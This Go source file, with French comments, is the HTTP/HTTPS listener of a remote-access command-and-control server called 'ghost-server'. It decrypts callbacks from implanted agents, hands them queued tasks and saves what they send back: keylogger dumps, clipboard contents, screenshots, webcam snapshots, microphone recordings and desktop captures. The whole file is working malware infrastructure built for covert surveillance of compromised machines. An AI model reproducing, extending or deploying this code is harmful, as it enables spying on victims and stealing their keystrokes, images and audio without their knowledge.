/*
 * http.go - Listener HTTP/HTTPS pour les callbacks agents
 */
package listener

import (
	"encoding/base64"
	"encoding/json"
	"io"
	"log"
	"net/http"
	"strconv"
	"fmt"


	"ghost-server/internal/crypto"
	"ghost-server/internal/handlers"
	"ghost-server/internal/profile"
	"ghost-server/internal/session"
	"ghost-server/internal/task"
	"ghost-server/pkg/protocol"
)

// HTTPListener gère les callbacks HTTP des agents
type HTTPListener struct {
	sessions *session.Manager
	tasks    *task.Queue
	profile  *profile.Profile
	server   *http.Server
	running  bool
}

// NewHTTPListener crée un nouveau listener HTTP
func NewHTTPListener(sessions *session.Manager, tasks *task.Queue, prof *profile.Profile) *HTTPListener {
	return &HTTPListener{
		sessions: sessions,
		tasks:    tasks,
		profile:  prof,
	}
}

// Start démarre le listener sur le port spécifié
func (l *HTTPListener) Start(port int) error {
	mux := http.NewServeMux()

	// Routes pour les agents (utilise les URIs du profil si dispo)
	mux.HandleFunc("/", l.handleCallback)

	l.server = &http.Server{
		Addr:    ":" + strconv.Itoa(port),
		Handler: mux,
	}

	l.running = true
	return l.server.ListenAndServe()
}

// StartTLS démarre le listener en HTTPS
func (l *HTTPListener) StartTLS(port int, certFile, keyFile string) error {
	mux := http.NewServeMux()
	mux.HandleFunc("/", l.handleCallback)

	l.server = &http.Server{
		Addr:    ":" + strconv.Itoa(port),
		Handler: mux,
	}

	l.running = true
	return l.server.ListenAndServeTLS(certFile, keyFile)
}

// Stop arrête le listener
func (l *HTTPListener) Stop() error {
	l.running = false
	if l.server != nil {
		return l.server.Close()
	}
	return nil
}

// handleCallback traite les requêtes des agents
func (l *HTTPListener) handleCallback(w http.ResponseWriter, r *http.Request) {
	// Log la requête
	log.Printf("[Listener] %s %s from %s", r.Method, r.URL.Path, r.RemoteAddr)

	// Lit le body
	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()

	// Si pas de body, c'est peut-être un heartbeat ou un GET
	if len(body) == 0 {
		w.WriteHeader(http.StatusOK)
		return
	}

	// Décode base64
	decoded, err := base64.StdEncoding.DecodeString(string(body))
	if err != nil {
		log.Printf("[Listener] Base64 decode error: %v", err)
		http.Error(w, "Bad encoding", http.StatusBadRequest)
		return
	}

	// Déchiffre AES
	decrypted, err := crypto.DecryptWithDefaults(decoded)
	if err != nil {
		log.Printf("[Listener] Decryption error: %v", err)
		http.Error(w, "Decryption failed", http.StatusBadRequest)
		return
	}

	// Parse le JSON
	var request protocol.AgentRequest
	if err := json.Unmarshal(decrypted, &request); err != nil {
		log.Printf("[Listener] JSON parse error: %v", err)
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	// Route selon l'action
	var response []byte

	switch request.Action {
	case protocol.ActionCheckin:
		response = l.handleCheckin(&request)
	case protocol.ActionGetTasks:
		response = l.handleGetTasks(&request)
	case protocol.ActionResult:
		response = l.handleResult(&request)
	default:
		log.Printf("[Listener] Unknown action: %s", request.Action)
		response = l.buildResponse(false, "Unknown action", nil)
	}

	// Chiffre et encode la réponse
	encrypted, err := crypto.EncryptWithDefaults(response)
	if err != nil {
		log.Printf("[Listener] Encryption error: %v", err)
		http.Error(w, "Encryption failed", http.StatusInternalServerError)
		return
	}

	encoded := base64.StdEncoding.EncodeToString(encrypted)

	// Envoie la réponse
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Write([]byte(encoded))
}

// handleCheckin traite un check-in d'agent
func (l *HTTPListener) handleCheckin(req *protocol.AgentRequest) []byte {
	// Parse les données de check-in
	dataBytes, _ := json.Marshal(req.Data)
	var checkinData protocol.CheckinData
	if err := json.Unmarshal(dataBytes, &checkinData); err != nil {
		log.Printf("[Listener] Checkin data parse error: %v", err)
		return l.buildResponse(false, "Invalid checkin data", nil)
	}

	// Enregistre l'agent
	agent := l.sessions.Register(req.ID, &checkinData)
	log.Printf("[+] Agent checked in: %s (%s)", agent.GetDisplayName(), req.ID[:8])

	return l.buildResponse(true, "Welcome", nil)
}

// handleGetTasks retourne les tâches en attente pour un agent
func (l *HTTPListener) handleGetTasks(req *protocol.AgentRequest) []byte {
	// Met à jour le last seen
	l.sessions.UpdateLastSeen(req.ID)

	// Récupère les tâches pendantes
	pending := l.tasks.GetPending(req.ID)

	if len(pending) > 0 {
		log.Printf("[*] Sending %d task(s) to agent %s", len(pending), req.ID[:8])
	}

	// Retourne les tâches
	response := protocol.TasksResponse{Tasks: pending}
	return l.buildResponse(true, "", response)
}

// handleResult traite le résultat d'une tâche
func (l *HTTPListener) handleResult(req *protocol.AgentRequest) []byte {
	// Met à jour le last seen
	l.sessions.UpdateLastSeen(req.ID)

	// Parse le résultat
	dataBytes, _ := json.Marshal(req.Data)
	var result protocol.TaskResult
	if err := json.Unmarshal(dataBytes, &result); err != nil {
		log.Printf("[Listener] Result parse error: %v", err)
		return l.buildResponse(false, "Invalid result data", nil)
	}

	// Check for special handling (e.g. screenshot)
	if qt, ok := l.tasks.GetByID(result.TaskID); ok {
		if qt.Task.Command == protocol.CmdScreenshot && len(result.Data) > 0 {
			path, err := handlers.SaveScreenshot(req.ID, result.Data)
			if err == nil {
				result.Output = fmt.Sprintf("Screenshot saved to: %s", path)
				log.Printf("[+] Screenshot saved for agent %s: %s", req.ID[:8], path)
			} else {
				log.Printf("[-] Failed to save screenshot: %v", err)
				result.Output = fmt.Sprintf("Failed to save screenshot: %v", err)
			}
		}
		
		// Handle keylog dump results
		if qt.Task.Command == protocol.CmdKeylogDump && len(result.Output) > 0 && result.Output != "No keystrokes captured" {
			path, err := handlers.SaveKeylog(req.ID, result.Output)
			if err == nil {
				log.Printf("[+] Keylog saved for agent %s: %s", req.ID[:8], path)
				result.Output = fmt.Sprintf("Keylog saved to: %s\n\n%s", path, result.Output)
			} else {
				log.Printf("[-] Failed to save keylog: %v", err)
			}
		}

		// Handle clipboard dump results
		if qt.Task.Command == protocol.CmdClipboardDump && len(result.Output) > 0 && result.Output != "No clipboard data captured" {
			path, err := handlers.SaveClipboard(req.ID, result.Output)
			if err == nil {
				log.Printf("[+] Clipboard dump saved for agent %s: %s", req.ID[:8], path)
				result.Output = fmt.Sprintf("Clipboard dump saved to: %s\n\n%s", path, result.Output)
			} else {
				log.Printf("[-] Failed to save clipboard dump: %v", err)
			}
		}

		// Gère les résultats webcam
		if qt.Task.Command == protocol.CmdWebcamSnap && len(result.Data) > 0 {
			path, err := handlers.SaveWebcam(req.ID, result.Data)
			if err == nil {
				result.Output = fmt.Sprintf("Webcam snapshot saved to: %s", path)
				log.Printf("[+] Webcam snapshot saved for agent %s: %s", req.ID[:8], path)
			} else {
				log.Printf("[-] Failed to save webcam snapshot: %v", err)
				result.Output = fmt.Sprintf("Failed to save webcam: %v", err)
			}
		}

		// Gère les résultats microphone
		if qt.Task.Command == protocol.CmdMicRecord && len(result.Data) > 0 {
			path, err := handlers.SaveAudio(req.ID, result.Data)
			if err == nil {
				result.Output = fmt.Sprintf("Audio recording saved to: %s", path)
				log.Printf("[+] Audio recording saved for agent %s: %s", req.ID[:8], path)
			} else {
				log.Printf("[-] Failed to save audio recording: %v", err)
				result.Output = fmt.Sprintf("Failed to save audio: %v", err)
			}
		}

		// Gère les résultats desktop capture
		if qt.Task.Command == protocol.CmdDesktopCapture && len(result.Data) > 0 {
			path, err := handlers.SaveDesktopFrame(req.ID, result.Data)
			if err == nil {
				result.Output = fmt.Sprintf("Desktop frame saved to: %s", path)
				log.Printf("[+] Desktop frame saved for agent %s: %s", req.ID[:8], path)
			} else {
				log.Printf("[-] Failed to save desktop frame: %v", err)
				result.Output = fmt.Sprintf("Failed to save desktop frame: %v", err)
			}
		}
	}

	// Enregistre le résultat
	if l.tasks.SetResult(result.TaskID, &result) {
		log.Printf("[+] Received result for task %s from agent %s", result.TaskID[:8], req.ID[:8])
	}

	return l.buildResponse(true, "Result received", nil)
}

// buildResponse construit une réponse JSON
func (l *HTTPListener) buildResponse(success bool, message string, data interface{}) []byte {
	resp := protocol.ServerResponse{
		Success: success,
		Message: message,
		Data:    data,
	}
	bytes, _ := json.Marshal(resp)
	return bytes
}
